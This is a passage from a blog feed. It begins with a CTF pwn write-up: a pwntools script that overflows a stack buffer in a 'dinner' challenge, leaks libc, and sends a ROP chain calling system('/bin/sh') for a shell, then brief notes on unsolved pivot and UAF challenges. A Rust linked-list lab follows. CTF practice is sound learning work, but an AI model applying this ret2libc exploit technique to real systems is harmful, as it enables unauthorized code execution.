<span class="token comment"># 连接目标</span>

<span class="token comment">#p = process('./dinner')</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token string">"host.docker.internal"</span><span class="token punctuation">,</span><span class="token number">51040</span><span class="token punctuation">)</span>

libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./dinner'</span><span class="token punctuation">)</span>

rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>

puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>

pop_rdi_ret_offset <span class="token operator">=</span> rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rdi'</span><span class="token punctuation">,</span> <span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

system_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>

puts_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>

<span class="token comment"># 阶段1：设置 v1 残留值</span>

payload1 <span class="token operator">=</span>  <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">0xac</span>  <span class="token comment"># 填充到 v1 位置 (172 字节)</span>

payload1 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>

payload1 <span class="token operator">+=</span> <span class="token string">b'B'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">256</span> <span class="token operator">-</span> <span class="token number">0xac</span> <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span>  <span class="token comment"># 填充剩余</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"ticket."</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>

<span class="token comment"># 阶段2：让 scanf 失败</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"How many dishes would u like to eat?"</span><span class="token punctuation">)</span>
<span class="token comment">#gdb.attach(p)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token punctuation">)</span>  <span class="token comment"># 非数字输入，scanf 失败</span>

<span class="token comment">#第三步，回到开头泄露地址</span>

payload2 <span class="token operator">=</span> <span class="token string">b'B'</span> <span class="token operator">+</span> <span class="token string">b'C'</span> <span class="token operator">*</span> <span class="token number">87</span>   <span class="token comment"># 填满 buf[11]</span>

payload2 <span class="token operator">+=</span> <span class="token string">b'D'</span> <span class="token operator">*</span> <span class="token number">8</span>   <span class="token comment"># 填充</span>

payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>   <span class="token comment"># 填充rbp</span>

payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>call_1<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"What would you like to eat?"</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>

<span class="token comment">#第四步，跳过输入，泄露</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"ticket."</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

name <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

age_line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"age:"</span><span class="token punctuation">,</span>age_line<span class="token punctuation">)</span>

age_hex <span class="token operator">=</span> age_line<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

age <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>age_hex<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>

system <span class="token operator">=</span>  age <span class="token operator">+</span> <span class="token number">0x64750</span> <span class="token operator">-</span> <span class="token number">0x9eef3</span>

libc_base <span class="token operator">=</span> system <span class="token operator">-</span> system_offset

pop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> pop_rdi_ret_offset

<span class="token comment"># 第五步，跳过</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"How many dishes would u like to eat?"</span><span class="token punctuation">)</span>

<span class="token comment">#p.send(b'a')</span>

payload3 <span class="token operator">=</span> <span class="token string">b'C'</span> <span class="token operator">*</span> <span class="token number">88</span>   <span class="token comment"># 填满 buf[11]</span>

payload3 <span class="token operator">+=</span> <span class="token string">b'D'</span> <span class="token operator">*</span> <span class="token number">8</span>   <span class="token comment"># 填充</span>

<span class="token comment">#payload3 += b'E' * 8    # 填充rbp</span>

payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>

payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>

payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>

payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>

payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Okey, then What would you like to eat?"</span><span class="token punctuation">)</span>
<span class="token comment">#gdb.attach(p)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system:"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"pop_rdi"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>简洁至极的程序，除了libc和16字节的栈溢出真就什么都没有。如果给个pop rdi ret的gadget就可以很舒适地调用puts泄露libc基地址，栈迁移重新ROP，然而啥也没有。</p>
<p>尝试迁移后直接puts泄露got表，但是没有成功，疑似是<code>RELRO: Full RELRO</code>干的好事</p>
<p>尝试学习ret2dl-resolve，并没有掌握于是未果</p>
<h2 id="uniform"><a href="#uniform" class="headerlink" title="uniform"></a>uniform</h2><p>能看得出是UAF漏洞，但是涉及堆，还没学过，本来想pivot解完去学的，结果卡死了，不会</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;ret&quot;&gt;&lt;a href=&quot;#ret&quot; class=&quot;headerlink&quot; title=&quot;ret&quot;&gt;&lt;/a&gt;ret&lt;/h2&gt;&lt;p&gt;签到题，明摆着的栈溢出和后门函数，略&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-python&quot;</summary>
        
      
    
    
    
    <category term="ctf" scheme="https://aucept.in/categories/ctf/"/>
    
    
    <category term="pwn" scheme="https://aucept.in/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>数据结构_链表实验</title>
    <link href="https://aucept.in/2025/09/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8%E5%AE%9E%E9%AA%8C/"/>
    <id>https://aucept.in/2025/09/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8%E5%AE%9E%E9%AA%8C/</id>
    <published>2025-09-28T09:50:00.000Z</published>
    <updated>2025-10-18T05:50:50.172Z</updated>
    
    <content type="html"><![CDATA[<p>上一篇是根据rust语言圣经的指导写的迭代器版本，这次我想用一种更贴近过程式的风格</p>
<h2 id="实验一：城市链表"><a href="#实验一：城市链表" class="headerlink" title="实验一：城市链表"></a>实验一：城市链表</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">城市链表:
    将若干城市的信息，存入一个带头结点的链表中。结点中的城市信息包括:城市名和标进行有关查找、插入、删除、更新等操作。城市的位置坐标。要求能够利用城市名和位置
基本要求:
    ①给定一个城市名，返回其位置坐标:
    ②给定一个位置坐标P和一个距离 D，返回所有与 P的距离小于等于 D 的城市。
测试数据:
    依据软件工程的测试技术自己确定，注意则试边界数据。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>首先是定义单链表的结构，不需要实现泛型：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">type</span> <span class="token type-definition class-name">Link</span><span class="token operator">=</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Rc</span><span class="token operator">&lt;</span><span class="token class-name">RefCell</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token operator">></span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token type-definition class-name">Head</span><span class="token punctuation">&#123;</span>
    first <span class="token punctuation">:</span> <span class="token class-name">Link</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[derive(Clone)]</span>
<span class="token keyword">struct</span> <span class="token type-definition class-name">Node</span><span class="token punctuation">&#123;</span>
    city_name <span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span>
    p_x <span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span>
    p_y <span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span>
    next <span class="token punctuation">:</span> <span class="token class-name">Link</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>由于不能保证字符串可以在编译期确定，所以这里不能用&amp;str，虽说实验没做要求</p>
<p>先写几个简单的：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">impl</span> <span class="token class-name">Head</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Head</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> new_list<span class="token operator">=</span> <span class="token class-name">Head</span><span class="token punctuation">&#123;</span>first<span class="token punctuation">:</span> <span class="token class-name">None</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        new_list
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span> x <span class="token punctuation">:</span>c_double<span class="token punctuation">,</span> y<span class="token punctuation">:</span>c_double<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> new_node <span class="token operator">=</span> <span class="token class-name">Node</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>
        new_node<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>first <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Rc</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">RefCell</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">impl</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>name<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span> x<span class="token punctuation">:</span>c_double<span class="token punctuation">,</span> y<span class="token punctuation">:</span>c_double<span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> new_node <span class="token operator">=</span> <span class="token class-name">Node</span><span class="token punctuation">&#123;</span>city_name <span class="token punctuation">:</span> name<span class="token punctuation">,</span> p_x<span class="token punctuation">:</span> x<span class="token punctuation">,</span> p_y<span class="token punctuation">:</span> y<span class="token punctuation">,</span> next <span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token punctuation">::</span><span class="token class-name">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        new_node
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">mod</span> <span class="token module-declaration namespace">test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token keyword">super</span><span class="token punctuation">::</span><span class="token class-name">Head</span><span class="token punctuation">;</span>
    <span class="token attribute attr-name">#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_insert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> head <span class="token operator">=</span> <span class="token class-name">Head</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4.0</span><span class="token punctuation">,</span><span class="token number">4.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>take可以将option里的东西拿出来，移交所有权并替换为None，用在这里再合适不过。</p>
<p>接下来就要面临所有权的问题：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">find_with_name</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token keyword">f64</span><span class="token punctuation">,</span> <span class="token keyword">f64</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> name <span class="token operator">==</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>city_name<span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>p_x<span class="token punctuation">,</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>p_y<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            current <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1f64</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1f64</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>问题出在<code>current = node.borrow().next;</code>，current明明是一个Link的不可变引用，怎么能把Link直接给它</p>
<p>如果变成<code>current = &amp;node.borrow().next;</code>又有了新的问题，node马上就要离开作用域被释放了，current怎么还能持有其引用</p>
<p>那么问题来到了current的声明<code>let mut current = &amp;self.first;</code>，略作调整<code>let mut current = self.first.clone();</code>这样current就不再是引用，而拷贝的实际是个指针，没有什么额外开销<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">find_with_name</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token keyword">f64</span><span class="token punctuation">,</span> <span class="token keyword">f64</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> name <span class="token operator">==</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>city_name<span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>p_x<span class="token punctuation">,</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>p_y<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            current <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1f64</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1f64</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[test]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">test_find_with_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> head <span class="token operator">=</span> <span class="token class-name">Head</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4.0</span><span class="token punctuation">,</span><span class="token number">4.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_name</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> <span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_name</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_name</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_name</span><span class="token punctuation">(</span><span class="token string">"foobar"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>两次clone指针成功解决了所有权问题，测试也是顺利通过</p>
<p>接下来根据距离筛城市，如法炮制：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">find_with_distance</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span>position<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">f64</span><span class="token punctuation">,</span><span class="token keyword">f64</span><span class="token punctuation">)</span><span class="token punctuation">,</span> distance<span class="token punctuation">:</span><span class="token keyword">f64</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> names <span class="token operator">=</span> <span class="token class-name">HashMap</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token function">calculate_distance</span><span class="token punctuation">(</span>position<span class="token punctuation">,</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>p_x<span class="token punctuation">,</span>node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>p_y<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> distance<span class="token punctuation">&#123;</span>
            names<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>city_name<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        current <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    names
<span class="token punctuation">&#125;</span>

<span class="token keyword">fn</span> <span class="token function-definition function">calculate_distance</span><span class="token punctuation">(</span>center <span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">f64</span><span class="token punctuation">,</span> <span class="token keyword">f64</span><span class="token punctuation">)</span><span class="token punctuation">,</span> city_position<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">f64</span><span class="token punctuation">,</span> <span class="token keyword">f64</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">f64</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">)</span> <span class="token operator">=</span> center<span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token punctuation">(</span>x2<span class="token punctuation">,</span> y2<span class="token punctuation">)</span> <span class="token operator">=</span> city_position<span class="token punctuation">;</span>

